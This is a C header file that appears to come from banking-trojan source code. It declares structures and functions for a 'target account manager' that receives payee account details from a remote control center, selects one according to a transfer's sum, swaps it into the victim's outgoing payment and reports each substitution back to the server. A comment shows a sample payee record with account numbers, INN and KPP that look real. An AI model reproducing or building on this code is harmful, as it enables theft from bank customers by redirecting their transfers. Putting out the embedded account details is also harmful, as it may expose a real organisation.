/*
	kbriTargetAccManager.h
*/
#pragma once

#include <Windows.h>

#include "KBRI.h"

// target account's restrictions to apply when using records
typedef struct _TA_LIMITS
{
	// all values here are in K
	DWORD dwTriggerSumMin;		// minimum sum to use this replacement. NB: a reasonable value should be used here
	DWORD dwTriggerSumMax;		// max transfer sum to use this replacement record. Setting 0 here will block record from further usage

	DWORD dwResultingSumMax;	// max sum of all records which may be assigned to this record (0 - no limit)
	DWORD dwMaxTransactionsCount;	// max amount of transactions to be assigned to this record (0 - no limit)
} TA_LIMITS, *PTA_LIMITS;


// structure describing a single account to be used in inject
typedef struct _TARGET_ACCOUNT
{
	DWORD dwRecordId;	// uniq record id, received from control center
	DWORD dwRevisionId;	// id of a revision, incremented by remote control center and used as a flag to initiate update of internal fields

	// *** received from control center
	TA_LIMITS limits;

	LPVOID pCryptedCreds;		// encrypted string with transaction credentials
	DWORD dwCryptedCredsLen;	// len of encoded data at ^

	// *** calculated at runtime

	DWORD dwTransactionsCount;	// total amount of transactions assigned 
	DWORD dwSum;				// total sum in all assigned transactions

} TARGET_ACCOUNT, *PTARGET_ACCOUNT;


// single chunk pointer by linked list
typedef struct _TARGET_ACCOUNT_CHUNK TARGET_ACCOUNT_CHUNK;
typedef struct _TARGET_ACCOUNT_CHUNK
{
	TARGET_ACCOUNT_CHUNK *lcNext;
	TARGET_ACCOUNT ta;					// NB: payload in head item is not used

} TARGET_ACCOUNT_CHUNK, *PTARGET_ACCOUNT_CHUNK;

// structure description of a linked list 
typedef struct _TARGACCS_LIST
{
	TARGET_ACCOUNT_CHUNK ipHead;	// list head for a list of target accounts
	DWORD dwtaCount;				// amount of ^
	CRITICAL_SECTION cstaAccess;	// cs to guard access to a list

} TARGACCS_LIST, *PTARGACCS_LIST;



// binary chunk supplied by remote control side
#pragma pack(push)
#pragma pack(1)

// describes an internal structure with all creds data alltogether (without limits data)
// used at tamAddUpdateRecord() as pCreds
// All creds are linked without any separator
typedef struct _TACC_CREDS
{
	BYTE	bic[9];
	BYTE	CorrespAcc[20];
	BYTE	PersonalAcc[20];
	BYTE	inn[10];
	BYTE	kpp[9];
	BYTE	bGP;		// generate purpose description flag
	BYTE	bNameLen;	// len of Name, not including null terminator
	BYTE	Name;	// start of buffer

} TACC_CREDS, *PTACC_CREDS;

// single account buffer, supplied by remote side
typedef struct _TACC
{
	//WORD wLen;	// len of whole structure, to parse several joined items // not needed here
	DWORD dwRecId;		// uniq value identifying specific t-acc record
	DWORD dwRevisionId;	// incremental value to detect changes in record

	// limits
	DWORD dwTransMin;
	DWORD dwTransMax;
	DWORD dwTransCount;
	DWORD dwTransSum;

	// creds, encoded by remote side
	WORD wCredsLen;
	BYTE Creds;	// start of buffer

} TACC, *PTACC;

// structure to notify remote control about single replacement performed
typedef struct _KBRI_INJECT_NOTIFY
{
	WORD wLen;	// size of structure, with all data appended

	DWORD dwRecordId;	// record id used for replacement
	DWORD dwTransSum;	// original trans sum retrieved, in K

	//BYTE[] bDetails;	// details information appended, text buffer

} KBRI_INJECT_NOTIFY, *PKBRI_INJECT_NOTIFY;

#pragma pack(pop)


// decoded transaction creds, returned to user, made from TARGET_ACCOUNT.pCryptedCreds
// NB: all records here are win-1251 ansi
// <Payee PersonalAcc="40702810355160004208" INN="7814522256" KPP="781401001"><Name>ÎÎÎ "Þëìàðò ÐÑÊ"</Name><Bank BIC="044030653" CorrespAcc="30101810500000000653"/></Payee>
typedef struct _DECODED_CREDS
{
	BYTE bGP;
	LPSTR szBIC;		// 9
	LPSTR szCorrespAcc;	// 20
	LPSTR szPersonalAcc; // 20
	LPSTR szINN;	// 10
	LPSTR szKPP;	// 9
	LPSTR szName;
} DECODED_CREDS, *PDECODED_CREDS;


VOID tamInit(TARGACCS_LIST *tal);
BOOL tamAddUpdateRecord(TARGACCS_LIST *tal, DWORD dwRecordId, DWORD dwRevisionId, TA_LIMITS *limits, LPVOID pCreds, DWORD dwCredsLen);
BOOL tamGetCredsBySum(TARGACCS_LIST *tal, DWORD dwTransSum, DECODED_CREDS *dCreds, LPVOID pTransferDetails, DWORD dwTransferDetailsLen);
VOID tamFreeDecodedCreds(DECODED_CREDS *dCreds);
BOOL tamDecodeCreds(TARGET_ACCOUNT *ta, DECODED_CREDS *dCreds);
BOOL tamRemoveRecord(TARGACCS_LIST *tal, DWORD dwRecordId);
VOID tamStartTAccsQueryThread(KBRI_GLOBALS *KBRI);
VOID tamIssueServerNotify(DWORD dwRecordId, DWORD dwTransSum, LPVOID pDetails, DWORD dwDetailsLen);
